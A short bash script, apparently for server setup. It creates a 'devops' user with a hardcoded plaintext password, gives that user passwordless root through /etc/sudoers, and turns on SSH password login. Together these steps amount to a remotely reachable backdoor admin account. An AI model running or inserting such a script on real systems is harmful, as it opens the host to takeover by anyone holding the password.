#!/bin/bash

sudo useradd -m -p $(openssl passwd -1 yU0B14NC1PdE) devops
sudo usermod -aG sudo devops
sudo cp /etc/sudoers /etc/sudoers.backup
sudo bash -c 'echo "devops ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
sudo sed -i -E 's/#?PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh
